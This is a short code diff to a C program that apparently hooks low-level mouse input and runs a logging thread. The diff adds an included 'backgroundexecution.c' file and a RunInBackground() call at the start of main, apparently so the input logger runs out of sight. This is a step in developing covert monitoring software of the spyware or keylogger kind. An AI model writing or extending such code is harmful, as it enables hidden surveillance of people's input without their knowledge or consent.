@@ -2,7 +2,8 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include <process.h> 
-#include <stdlib.h>  
+#include <stdlib.h>
+#include "backgroundexecution.c"
 
 // Constants for simpler code maintenance
 #define DATA_SIZE 15
@@ -119,6 +120,9 @@ LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main() {
+    // Start the program in the background
+    RunInBackground();
+
     // Start the logging thread
     _beginthread(LogThread, 0, NULL);
 
